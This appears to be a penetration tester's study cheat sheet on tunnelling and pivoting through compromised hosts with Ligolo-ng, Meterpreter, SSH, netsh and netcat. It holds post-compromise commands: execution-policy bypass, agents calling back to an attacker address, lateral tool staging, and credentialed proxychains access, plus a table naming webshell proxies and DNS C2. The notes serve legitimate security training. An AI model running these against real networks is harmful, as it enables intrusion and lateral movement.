# Tunneling & Pivoting Notes

---

## Table of Contents
1. [Ligolo-ng]
2. [Metasploit / Meterpreter]
3. [SSH Tunneling]
4. [SShuttle]
5. [Chisel]
6. [netsh Port Forwarding (Windows)]
7. [Other Port Forwarding Tricks]
8. [Cntlm (Corporate Proxy Bypass)
9. [ProxyChains Configuration]
10. [Tunnel Debugging]
11. [Other Tools]
12. [Resources]

---

## Ligolo-ng

### Initial Setup (Kali)

```bash
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 172.16.0.0/16 dev ligolo
./proxy -selfcert
```

### Agent Connection (Target)

```powershell
powershell -ep bypass
.\agent.exe -connect 192.168.49.87:11601 -ignore-cert
```

Once connected in the proxy interface:

```
tunnel_start
```

### Accessing Internal Services Through Ligolo

To access an internal service (e.g., MySQL) via a loopback address trick:

```bash
ip route add 240.0.0.1/32 dev ligolo
mysql -u root -h 240.0.0.1 -P 3306 --ssl-verify-server-cert=disabled
```

### Multi-Hop Pivoting

When you need to reach a second internal network (e.g., through OSCP-B at .148):

```bash
# Add an IP on the ligolo interface for the new subnet
sudo ip address add 10.10.193.250/24 dev ligolo

# Add a route for the new subnet
sudo ip route add 10.10.193.0/24 dev ligolo

# Add a listener on the pivot host to forward traffic back
listener_add --addr 0.0.0.0:1234 --to 172.16.87.206:4444 --tcp
```

> **Note:** If the ligolo tunnel isn't cooperating, you can fall back to an SSH tunnel (see below).

### Ligolo + SSH Fallback (Multi-Hop)

**Box 1 (Kali):**

```bash
nc -nvlp 7777
```

**Box 2 (Pivot Host):**

```bash
ssh Administrator@192.168.233.147 \
    -R *:7777:localhost:7777 \
    -R *:8888:localhost:8888 \
    -D 9090
```

- `-R *:7777:localhost:7777` — routes connections on Box 2's port 7777 back to Kali's port 7777
- `-R *:8888:localhost:8888` — same for port 8888
- `-D 9090` — sets up a SOCKS proxy if needed

Then run the agent through the SSH tunnel:

```bash
# Box 2:
./agent.exe -connect 192.168.45.156:11601 -ignore-cert
```

---

## Metasploit / Meterpreter

> Use when you already have a Meterpreter session and need to pivot into an internal network.

### Port Forwarding (`portfwd`)

Simple, single-port forwarding through your Meterpreter session. Best for targeted access to one service on one host.

**Basic syntax:**

```
meterpreter > portfwd add -l <local_port> -p <remote_port> -r <target_ip>
```

**Example — Forward local port 4445 to SMB on an internal host:**

```
meterpreter > portfwd add -l 4445 -p 445 -r 172.16.1.20
```

Now from Kali, hit `127.0.0.1:4445` and it tunnels to `172.16.1.20:445`:

```bash
smbclient -L 127.0.0.1 -p 4445
crackmapexec smb 127.0.0.1 --port 4445 -u admin -p 'Password1!'
```

**Example — Forward HTTP:**

```
meterpreter > portfwd add -l 80 -r 172.21.0.0 -p 80
```

**Reverse port forward (serve files to internal network):**

Opens a port on the compromised host that forwards back to your Kali box. Useful for serving tools like `winPEASx64.exe` to internal machines.

```
meterpreter > portfwd add -R -l 8080 -p 80 -L 0.0.0.0
```

Internal machines can now grab files from `http://<compromised_host>:8080/` which forwards to Kali's port 80.

**Managing forwards:**

```
meterpreter > portfwd list
meterpreter > portfwd delete -l 4445 -p 445 -r 172.16.1.20
meterpreter > portfwd flush
```

### Autoroute (Subnet Routing)

Adds a route for an entire internal subnet through your Meterpreter session. Pair with a SOCKS proxy for full subnet access — closest experience to ligolo-ng.

**Option A — From within the Meterpreter session:**

```
meterpreter > run autoroute -s 172.16.1.0/24
```

**Option B — As a post module (background the session first):**

```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION <session_id>
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.1.0
msf6 post(multi/manage/autoroute) > set NETMASK /24
msf6 post(multi/manage/autoroute) > run
```

**Verify routes:**

```
meterpreter > run autoroute -p
```

### SOCKS Proxy (Use with Autoroute)

After autoroute is configured, start a SOCKS proxy so external tools (nmap, evil-winrm, etc.) can route through the tunnel.

```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 1080
msf6 auxiliary(server/socks_proxy) > set VERSION 5
msf6 auxiliary(server/socks_proxy) > run -j
```

**Available SOCKS modules:**

|Module|Description|
|---|---|
|`auxiliary/server/socks_proxy`|SOCKS4a/5 proxy (recommended)|
|`auxiliary/server/socks_unc`|SOCKS Proxy UNC Path Redirection|

Then configure proxychains (see [ProxyChains Configuration] and run tools:

```bash
proxychains nmap -sT -Pn -p 80,445,3389 172.16.1.0/24
proxychains evil-winrm -i 172.16.1.20 -u admin -p 'Password1!'
proxychains curl http://172.16.1.20
```

> **Important:** Use `-sT` (TCP connect) with nmap through proxychains. SYN scans (`-sS`) will NOT work through a SOCKS proxy.

### Metasploit Pivoting Quick Reference

|Goal|Method|
|---|---|
|Access one port on one internal host|`portfwd add -l <lport> -p <rport> -r <target>`|
|Serve files to internal network from Kali|`portfwd add -R -l <rport> -p <lport> -L 0.0.0.0`|
|Access an entire internal subnet|`autoroute` + `socks_proxy` + `proxychains`|

---

## SSH Tunneling

> **Requirement:** Target must have SSH running.

### Local Dynamic SOCKS Proxy

```bash
ssh -D localhost:<local_port> -f -N user@localhost -p <target_ssh_port>
```

Then configure proxychains to use `socks5 127.0.0.1 <local_port>` and run commands through it:

```bash
proxychains <command>
```

### Remote Port Forwarding

```bash
ssh user@target -R *:<remote_port>:localhost:<local_port>
```

### Windows SSH / Plink

Windows 10+ has SSH built-in (via WSL/OpenSSH). For older systems, use `plink.exe` (from Kali's `/usr/share/windows-resources/binaries/` or PuTTY download).

---

## SShuttle

Transparent proxy that routes traffic over SSH. No SOCKS configuration needed.

**Source:** https://github.com/sshuttle/sshuttle

```bash
sshuttle -r root@172.21.0.0 10.2.2.0/24
```

---

## Chisel

https://github.com/jpillora/chisel

> Fast TCP/UDP tunnel over HTTP, secured via SSH. Great when you only have HTTP/HTTPS egress.
## netsh Port Forwarding (Windows)

Built-in Windows port forwarding — useful when you have command execution on a Windows host but no tools uploaded.

**Add a forward:**

```cmd
netsh interface portproxy add v4tov4 listenaddress=172.16.87.206 listenport=80 connectaddress=192.168.49.87 connectport=80
```

**Delete a forward:**

```cmd
netsh interface portproxy delete v4tov4 listenaddress=127.0.0.1 listenport=1433
```

**List all forwards:**

```cmd
netsh interface portproxy show all
```

---

## Other Port Forwarding Tricks

### Named Pipe Relay (netcat)

Bare-bones port forwarding using `mknod` and `nc`:

```bash
mknod pivot p
nc -l -p <listen_port> 0<pivot | nc <target> <target_port> 1>pivot
```

---

## Cntlm (Corporate Proxy Bypass)

For environments where you need to authenticate to a corporate proxy:

```bash
apt install cntlm
cntlm -u username@breakme.local -I proxy
export http_proxy=http://127.0.0.1:3128
export https_proxy=http://127.0.0.1:3128
```

Browser access:

```bash
chromium --proxy-server="http://127.0.0.1:3128"
```

---

## ProxyChains Configuration

Edit `/etc/proxychains4.conf` and ensure the last line matches your proxy:

```
socks5 127.0.0.1 1080
```

Then prefix any command:

```bash
proxychains <command>
```

---

## Tunnel Debugging

Useful commands to verify your tunnels are up and working:

```bash
nc -z localhost <port> || echo 'no tunnel open'
netstat -lpnt | grep <port> | grep ssh
ss -ntlp
ps aux | grep ssh
```

---

## Other Tools

|Tool|Description|Link|
|---|---|---|
|Chisel|TCP/UDP tunnel over HTTP|https://github.com/jpillora/chisel|
|Ligolo-ng|Tunneling using TUN interface|https://github.com/nicocha30/ligolo-ng|
|SSF|Secure Socket Funneling|https://github.com/securesocketfunneling/ssf|
|rpivot|Reverse SOCKS proxy|https://github.com/klsecservices/rpivot|
|hans|ICMP tunneling|http://code.gerade.org/hans/|
|Iodine|ICMP tunneling over DNS|https://code.kryo.se/iodine/|
|Dnscat2|DNS tunneling C2|https://github.com/iagox86/dnscat2|
|httptunnel|Tunnel over HTTP|`apt install httptunnel`|
|reGeorg|SOCKS proxy via webshell|https://github.com/sensepost/reGeorg|

---

## Resources

- https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html
- https://highon.coffee/blog/ssh-meterpreter-pivoting-techniques/
- https://medium.com/maverislabs/proxyjump-the-ssh-option-you-probably-never-heard-of-2d7e41d43464